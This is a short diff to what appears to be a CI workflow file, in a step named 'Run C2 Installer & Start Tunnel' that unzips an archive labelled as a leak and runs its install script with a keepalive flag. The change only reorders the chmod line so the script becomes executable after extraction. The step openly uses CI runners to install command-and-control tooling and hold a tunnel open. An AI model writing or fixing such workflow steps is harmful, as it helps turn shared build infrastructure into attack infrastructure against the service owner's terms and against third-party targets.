@@ -20,6 +20,6 @@ jobs:
 
       - name: Run C2 Installer & Start Tunnel
         run: |
-          chmod +x install.sh
           unzip ./agarnetshitleakbyVessy1337.zip
+          chmod +x install.sh
           ./install.sh --keepalive
